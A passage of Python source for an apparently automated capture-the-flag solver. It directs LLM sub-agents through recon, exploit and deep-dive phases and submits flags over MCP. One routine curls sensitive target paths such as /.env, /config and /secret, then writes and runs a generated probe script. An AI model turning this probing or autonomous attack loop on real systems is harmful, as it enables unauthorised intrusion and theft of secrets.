            await self._safe_stop(code)
            return report

        # ══ Phase 1: Recon ══
        recon_rl = budget["recon_steps"] * RECURSION_MULTIPLIER
        self._emit("system", f"[Phase1-侦察] {title} ({code}, {difficulty}) 预算: {budget['recon_steps']}步, recursion_limit={recon_rl}")
        recon_system = pb.build_child_system_prompt(
            "recon", title=title, code=code, entrypoint=entrypoint_str,
            context=context, difficulty=difficulty, description=description,
        )
        recon_mission = pb.build_recon_mission(
            title=title, code=code, entrypoint=entrypoint_str,
            context=context, difficulty=difficulty, description=description,
        )
        recon_agent = create_deep_agent(model=model, system_prompt=recon_system, tools=tools)
        recon_report = await self._run_streamed_deep_agent(
            recon_agent, recon_mission,
            recursion_limit=recon_rl,
            timeout_seconds=budget["recon_timeout"],
            step_budget=budget["recon_steps"],
            challenge_code=code,
        )

        if self.notes.is_solved(code):
            self._emit("system", f"[Phase1] {title}: 侦察阶段即已解决！")
            await self._safe_stop(code)
            return recon_report

        existing_notes = self.notes.get_challenge_notes(code)
        if not existing_notes or "暂无" in existing_notes:
            recon_text = recon_report.final_message or ""
            if recon_text:
                self.notes.save_challenge_note(code, "recon", f"[自动保存-Phase1]\n{recon_text[:3000]}")

        recon_findings = self.notes.get_challenge_notes(code)
        recon_cache = self.cache.get_recon(code)
        all_findings = f"{recon_findings}\n\n{recon_cache}" if recon_cache else recon_findings

        # ══ Phase 2: Exploit ══
        self._reset_counters_for_challenge(code)
        exploit_rl = budget["exploit_steps"] * RECURSION_MULTIPLIER
        self._emit("system", f"[Phase2-利用] {title} ({code}, {difficulty}) 预算: {budget['exploit_steps']}步, recursion_limit={exploit_rl}")
        attack_dirs = derive_attack_directions(
            all_findings, difficulty, description=description, title=title,
        )
        exploit_system = pb.build_child_system_prompt(
            "exploit", title=title, code=code, entrypoint=entrypoint_str,
            context=all_findings[:2000], difficulty=difficulty, description=description,
        )
        exploit_mission = pb.build_exploit_mission(
            title=title, code=code, entrypoint=entrypoint_str,
            recon_findings=all_findings[:4000], attack_directions=attack_dirs,
            difficulty=difficulty,
        )
        exploit_agent = create_deep_agent(model=model, system_prompt=exploit_system, tools=tools)
        exploit_report = await self._run_streamed_deep_agent(
            exploit_agent, exploit_mission,
            recursion_limit=exploit_rl,
            timeout_seconds=budget["exploit_timeout"],
            step_budget=budget["exploit_steps"],
            challenge_code=code,
        )

        if self.notes.is_solved(code):
            self._emit("system", f"[Phase2] {title}: 利用阶段已解决！")
            await self._safe_stop(code)
            return exploit_report

        # ── Forced flag extraction ──
        if ep_url:
            await self._try_extract_flags(code, title, ep_url)
            if self.notes.is_solved(code):
                await self._safe_stop(code)
                return exploit_report

        # ══ Phase 3: Deep Dive ══
        if budget["deep_steps"] > 0 and difficulty in ("medium", "hard"):
            self._reset_counters_for_challenge(code)
            deep_rl = budget["deep_steps"] * RECURSION_MULTIPLIER
            self._emit("system", f"[Phase3-深挖] {title} ({code}) 预算: {budget['deep_steps']}步, recursion_limit={deep_rl}")
            deep_context = self._build_context(code, description=description, title=title)
            attempts = self.notes.get_attempts(code)
            failed_lines = [f"  - {a['method']} → {a['result']}" for a in (attempts or [])[-20:]]
            deep_system = pb.build_child_system_prompt(
                "deep_dive", title=title, code=code, entrypoint=entrypoint_str,
                context=deep_context, difficulty=difficulty, description=description,
            )
            deep_mission = pb.build_retry_mission(
                title=title, code=code, round_num="深挖",
                entrypoint=entrypoint_str, context=deep_context,
                failed_attempts="\n".join(failed_lines) if failed_lines else "暂无",
            )
            deep_agent = create_deep_agent(model=model, system_prompt=deep_system, tools=tools)
            await self._run_streamed_deep_agent(
                deep_agent, deep_mission,
                recursion_limit=deep_rl,
                timeout_seconds=budget["deep_timeout"],
                step_budget=budget["deep_steps"],
                challenge_code=code,
            )

        await self._safe_stop(code)
        return exploit_report

    async def _try_extract_flags(self, code: str, title: str, ep_url: str) -> None:
        """通用 flag 提取：静态路径 → API 字段名反向探测 → 全路径 python3 扫描。

        核心思路：不依赖 LLM 自己想到正确攻击方式，系统自动做三件事：
        1. 静态路径快速试探
        2. 发现 API 后：读响应字段名 → 反向用作请求参数（通用渗透技巧）
        3. 全路径 python3 无截断扫描
        """
        self._emit("system", f"[flag搜索] {title}: 强制提取尝试")
        base = ep_url.rstrip("/")

        async def _check_and_submit(stdout: str) -> bool:
            for f in re.findall(r"flag\{[^}]+\}", stdout):
                if _is_fake_flag(f):
                    self._emit("system", f"[flag搜索] 跳过疑似测试flag: {f}")
                    continue
                self._emit("system", f"[flag搜索] 发现: {f}")
                submit_result = await self._throttled_submit(code, f)
                if '"correct": true' in submit_result or "答案正确" in submit_result:
                    self.notes.record_solved(code, f)
                    self._emit("system", f"[flag搜索] {title}: 成功！")
                    return True
            return False

        # Phase 1: common static paths
        for path in ["/flag", "/flag.txt", "/api/flag", "/admin/flag", "/console",
                     "/debug", "/robots.txt", "/.env", "/config", "/secret",
                     "/admin", "/api/v1/flag", "/api/admin"]:
            try:
                result = await self._bash.run(
                    f"curl -s --max-time 5 {base}{path} 2>/dev/null", timeout_seconds=8
                )
                if await _check_and_submit(self._extract_stdout(result)):
                    return
                if self._bash.last_flags_found:
                    for f in self._bash.last_flags_found:
                        if await _check_and_submit(f):
                            return
            except Exception:
                pass

        # Phase 2: write a probe script to unique temp file and execute it
        safe_code = re.sub(r'[^a-zA-Z0-9_]', '_', code)
        script_path = f"/tmp/_owprobe_{safe_code}.py"
        try:
            probe_code = _build_api_probe_script(base)
            self._emit("system", f"[flag搜索] {title}: 写入探测脚本 → {script_path}")
            write_res = await self._bash.run(
                f"cat > {script_path} << 'PROBE_EOF'\n{probe_code}\nPROBE_EOF\necho WROTE_OK",
                timeout_seconds=5,
            )
            write_stdout = self._extract_stdout(write_res)
            if "WROTE_OK" not in write_stdout:
                self._emit("system", f"[flag搜索] {title}: 写入探测脚本失败: {write_stdout[:200]}")
            else:
                self._emit("system", f"[flag搜索] {title}: 执行探测脚本...")
                result = await self._bash.run(f"python3 {script_path} 2>&1", timeout_seconds=90)
                stdout = self._extract_stdout(result)
                self._emit("system", f"[flag搜索] {title}: 脚本输出({len(stdout)}字符): {stdout[:300]}")
                if await _check_and_submit(stdout):
                    return
                if self._bash.last_flags_found:
                    for f in self._bash.last_flags_found:
                        if await _check_and_submit(f):
                            return
        except Exception as exc:
            self._emit("system", f"[flag搜索] {title}: 探测脚本异常: {type(exc).__name__}: {exc}")
        finally:
            try:
                await self._bash.run(f"rm -f {script_path}", timeout_seconds=3)
            except Exception:
                pass

    async def _safe_stop(self, code: str) -> None:
        try:
            await self._call_mcp("stop_challenge", {"code": code})
        except Exception:
            pass
        self._challenge_ep_cache.pop(code, None)

    # ── MCP call with semantic dedup ──────────────────────────

    _EXEMPT_FROM_REPEAT_CHECK = frozenset({
        "start_challenge", "stop_challenge", "list_challenges", "submit_flag",
    })

    def _reset_counters_for_challenge(self, code: str) -> None:
        keys_to_delete = [k for k in self._tool_call_counters if code in k]
        for k in keys_to_delete:
            del self._tool_call_counters[k]
        self._tool_call_history = []

    def _is_semantically_duplicate(self, tool_name: str, arguments: dict[str, Any]) -> bool:
        normalized_args = json.dumps(arguments, ensure_ascii=False, sort_keys=True).lower().strip()
        call_sig = f"{tool_name}:{normalized_args}"

        similar_count = 0
        for prev in self._tool_call_history[-20:]:
            if prev == call_sig:
                similar_count += 1
            elif tool_name in prev:
                prev_args = prev.split(":", 1)[1] if ":" in prev else ""
                if self._args_similar(normalized_args, prev_args):
                    similar_count += 1

        self._tool_call_history.append(call_sig)
        return similar_count >= self._repeat_call_limit

    @staticmethod
    def _args_similar(a: str, b: str) -> bool:
        clean_a = set(re.sub(r'[\s"\']', '', a))
        clean_b = set(re.sub(r'[\s"\']', '', b))
        if not clean_a or not clean_b:
            return False
        overlap = len(clean_a & clean_b) / max(len(clean_a), len(clean_b))
        return overlap > 0.85

    async def _call_mcp(self, tool_name: str, arguments: dict[str, Any]) -> str:
        if self._mcp_session is None:
            raise RuntimeError("MCP session not initialized")

        self._emit("tool_call", f"调用工具: {tool_name}，参数: {json.dumps(arguments, ensure_ascii=False)}")

        if tool_name not in self._EXEMPT_FROM_REPEAT_CHECK:
            if self._is_semantically_duplicate(tool_name, arguments):
                msg = f"检测到语义重复调用: {tool_name}。请停止重复，转向其他方向。"
                self._emit("tool_result", f"[{tool_name}] 结果: {msg}")
                return msg

            call_key = f"{tool_name}:{json.dumps(arguments, ensure_ascii=False, sort_keys=True)}"
            count = self._tool_call_counters.get(call_key, 0) + 1
            self._tool_call_counters[call_key] = count
            if count > self._repeat_call_limit:
                msg = f"检测到重复调用: {tool_name} 已 {count} 次。请转向下一步。"
                self._emit("tool_result", f"[{tool_name}] 结果: {msg}")
                return msg

        result = await call_tool(self._mcp_session, tool_name, arguments)

        if hasattr(result, "content") and isinstance(result.content, list):
            parts = [getattr(item, "text", None) or str(item) for item in result.content]
            result_text = "\n".join(parts)
        else:
            result_text = str(result)

        self._emit("tool_result", f"[{tool_name}] 结果: {result_text[:500]}")
        return result_text

    # ── Main competition loop ─────────────────────────────────

    @staticmethod
    def _try_parse_json(text: str) -> dict[str, Any] | None:
        try:
            data = json.loads(text)
            return data if isinstance(data, dict) else None
        except Exception:
            return None

    # ── Failure tracking ──────────────────────────────────────
    _MAX_CONSECUTIVE_FAILS: int = 3

    def _record_challenge_failure(self, code: str, title: str, round_num: int) -> None:
        """记录未解出赛题的失败信息，使用攻击方向分类而非裸命令。"""
        bash_history = self._phase_bash_history.get(code, [])
        deduped = list(dict.fromkeys(bash_history))[-80:]
        dir_summary = _classify_failed_directions(deduped)
        self.notes.save_challenge_note(
            code, "failure_record",
            f"[第{round_num}轮失败] 攻击步数已用完\n"
            f"已失败攻击方向分类:\n{dir_summary}\n"
            f"★ 下轮必须尝试不在以上分类中的全新方向 ★"
        )

    async def run_competition(self, mcp_session: ClientSession) -> AgentRunResult:
        logger.info("=== 开始 DeepAgents 闯关流程（策略主从模式） ===")
        self._mcp_session = mcp_session

        model = ChatOpenAI(
            model=self.config["MODEL_ID"],
            api_key=self.config["MODEL_API_KEY"],
            base_url=self.config["MODEL_BASE_URL"],
            temperature=0.2,
        )

        self._emit("system", f"模型已就绪: {self.model_name} ({self.config['MODEL_ID']})")
        self._emit("system", f"DeepAgents 参数: timeout={self._timeout_seconds}s, recursion_limit={self._recursion_limit}, max_concurrent={self._max_concurrent}")
        self._emit("user", MISSION_PROMPT)

        max_inner_rounds = int(self.config.get("DEEPAGENTS_MAX_RETRY_ROUNDS", "5"))
        continuous_mode = self.config.get("CONTINUOUS_MODE", "true").lower() in ("1", "true", "yes")
        cooldown_seconds = int(self.config.get("CONTINUOUS_COOLDOWN_SECONDS", "30"))
        results_map: dict[str, AgentRunResult | Exception] = {}
        total_iterations = 0
        global_cycle = 0

        while True:
            global_cycle += 1

            # ── Fetch fresh challenge list each cycle ──
            challenges_text = await self._call_mcp("list_challenges", {})
            challenges_data = self._try_parse_json(challenges_text) or {}
            challenges = challenges_data.get("challenges", [])
            if not isinstance(challenges, list):
                challenges = challenges_data.get("data", [])
            if not isinstance(challenges, list):
                challenges = []
            if not challenges:
                self._emit("system",
                    f"[诊断] list_challenges 未返回题目列表。keys={list(challenges_data.keys())}，"
                    f"原始长度={len(challenges_text)}")
                if self._last_good_challenges:
                    challenges = self._last_good_challenges
                    self._emit("system",
                        f"[诊断] 使用上次缓存的{len(challenges)}道题继续")
            elif len(challenges) >= len(self._last_good_challenges):
                self._last_good_challenges = challenges
            else:
                if self._last_good_challenges and len(challenges) < len(self._last_good_challenges) * 0.5:
                    self._emit("system",
                        f"[诊断] list_challenges返回{len(challenges)}题，远少于上次{len(self._last_good_challenges)}题，"
                        "疑似平台降级，沿用上次列表")
                    challenges = self._last_good_challenges
                else:
                    self._last_good_challenges = challenges
            initial_level = challenges_data.get("current_level")
            initial_total = challenges_data.get("total_challenges", 0)

            # ── 用平台数据校准本地notes（防止旧notes误标solved） ──
            for ch in challenges:
                if not isinstance(ch, dict):
                    continue
                ch_code = str(ch.get("code", ""))
                platform_solved = ch.get("flag_got_count", 0) >= ch.get("flag_count", 1)
                local_solved = self.notes.is_solved(ch_code)
                if local_solved and not platform_solved:
                    self.notes.clear_solved(ch_code)
                    self._emit("system",
                        f"[校准] {ch.get('title')}: 本地标记已解但平台未确认，清除旧记录")

            unsolved = [
                ch for ch in challenges
                if isinstance(ch, dict)
                and ch.get("flag_got_count", 0) < max(ch.get("flag_count", 1), 1)
            ]

            if not unsolved:
                msg = (
                    f"[大循环第{global_cycle}轮] 所有当前可见赛题已完成！"
                    f"（共{len(challenges)}题，solved判断: flag_got_count >= flag_count）"
                )
                if challenges:
                    summary = [(ch.get("title","?"), ch.get("flag_got_count",0), ch.get("flag_count",0))
                               for ch in challenges if isinstance(ch, dict)]
                    self._emit("system", f"[诊断] 各题状态: {summary}")
                self._emit("system", msg)
                if not continuous_mode:
                    break
                self._emit("system", f"持续模式：等待 {cooldown_seconds}s 后重新检查赛题列表...")
                await asyncio.sleep(cooldown_seconds)
                continue

            unsolved = self._sort_by_priority(unsolved)
            self._emit("system",
                f"[大循环第{global_cycle}轮] 发现 {len(unsolved)} 道未解赛题: "
                f"{[ch.get('title') for ch in unsolved]}")

            self._emit("system",
                f"[调度] 管理 {len(unsolved)} 道赛题，并发上限: {self._max_concurrent}")

            for round_num in range(1, max_inner_rounds + 1):
                self._current_round = round_num
                pending = [
                    ch for ch in unsolved
                    if not self.notes.is_solved(str(ch.get("code", "")))
                ]
                if not pending:
                    self._emit("system", f"[第{round_num}轮] 所有题目已解决")
                    break

                label = f"第{global_cycle}周期-第{round_num}轮{'(续攻)' if round_num > 1 else ''}"
                action = "start_exploit" if round_num > 1 else "start_recon"
                actionable = [
                    {"code": str(ch.get("code", "")), "action": action}
                    for ch in pending
                ]
                self._emit("system",
                    f"[{label}] 待处理: {len(pending)} 题，动作: {action}")

                sem = asyncio.Semaphore(self._max_concurrent)
                code_to_ch = {str(ch.get("code", "")): ch for ch in pending}

                async def _run_challenge(
                    ch: dict[str, Any], decision: dict[str, Any]
                ) -> None:
                    ch_code = str(ch.get("code", ""))
                    async with sem:
                        self._emit("system",
                            f"[调度] {label}: {ch.get('title')} ({ch_code}) → {decision.get('action')}")
                        try:
                            report = await self._run_single_challenge_agent(model, ch)
                            results_map[ch_code] = report
                            if not self.notes.is_solved(ch_code):
                                self._record_challenge_failure(
                                    ch_code, str(ch.get("title", "")), round_num)
                        except Exception as exc:
                            self._emit("system",
                                f"[调度] 异常: {ch.get('title')} ({ch_code}): {exc}")
                            results_map[ch_code] = exc

                tasks = [
                    _run_challenge(code_to_ch[d["code"]], d)
                    for d in actionable if d["code"] in code_to_ch
                ]
                if tasks:
                    await asyncio.gather(*tasks)

                try:
                    refresh_text = await self._call_mcp("list_challenges", {})
                    refresh_data = self._try_parse_json(refresh_text) or {}
                    rl = refresh_data.get("current_level")
                    rt = refresh_data.get("total_challenges", 0)
                    if (initial_level is not None and rl is not None
                            and (rl < initial_level or rt < initial_total)):
                        self._emit("system", "[调度] list_challenges 返回降级数据，跳过刷新")
                    else:
                        for ch in refresh_data.get("challenges", []):
                            if isinstance(ch, dict):
                                ch_code = str(ch.get("code", ""))
                                if ch.get("flag_got_count", 0) >= ch.get("flag_count", 1):
                                    self.notes.record_solved(ch_code, "platform_confirmed")
                except Exception:
                    pass

                still_unsolved = [
                    ch for ch in unsolved
                    if not self.notes.is_solved(str(ch.get("code", "")))
                ]
                self._emit("system",
                    f"[{label}] 本轮结束，剩余未解: {len(still_unsolved)} 题")
                if not still_unsolved:
                    break

            # ── Inner rounds done, check if we should continue ──
            still_unsolved_codes = [
                str(ch.get("code", "")) for ch in unsolved
                if not self.notes.is_solved(str(ch.get("code", "")))
            ]
            if still_unsolved_codes:
                self._emit("system",
                    f"[大循环第{global_cycle}轮完成] 仍有 {len(still_unsolved_codes)} 题未解，"
                    f"{'持续模式：冷却后重试' if continuous_mode else '退出'}")
                if continuous_mode:
                    await asyncio.sleep(cooldown_seconds)
                    continue
                else:
                    break
            else:
                self._emit("system", f"[大循环第{global_cycle}轮完成] 全部解出！")
                break

        # ── Summary ──
        summaries: list[str] = []
        try:
            final_text = await self._call_mcp("list_challenges", {})
            final_data = self._try_parse_json(final_text) or {}
            all_challenges = final_data.get("challenges", [])
        except Exception:
            all_challenges = []

        for ch in (all_challenges or []):
            if not isinstance(ch, dict):
                continue
            ch_code = str(ch.get("code", ""))
            ch_title = str(ch.get("title", ""))
            solved = (ch.get("flag_got_count", 0) >= ch.get("flag_count", 1)
                      or self.notes.is_solved(ch_code))
            result = results_map.get(ch_code)
            status = "已完成" if solved else "未完成"
            detail = ""
            if isinstance(result, AgentRunResult):
                total_iterations += result.iterations
                detail = result.final_message[:200] or "(无输出)"
            elif isinstance(result, Exception):
                detail = f"异常: {result}"
            else:
                detail = "(未执行)"
            summaries.append(f"- {ch_title} ({ch_code}): {status} | {detail}")

        solved_count = sum(1 for ch in all_challenges if isinstance(ch, dict)
                          and ch.get("flag_got_count", 0) >= ch.get("flag_count", 1))
        summaries.append(
            f"\n平台确认: 已完成 {solved_count}/{len(all_challenges)} 道赛题 | 共 {global_cycle} 个周期")

        final_message = "策略主从模式执行完成。各子智能体结果:\n" + "\n".join(summaries)
        self._emit("assistant", final_message)
        return AgentRunResult(final_message=final_message, iterations=total_iterations)
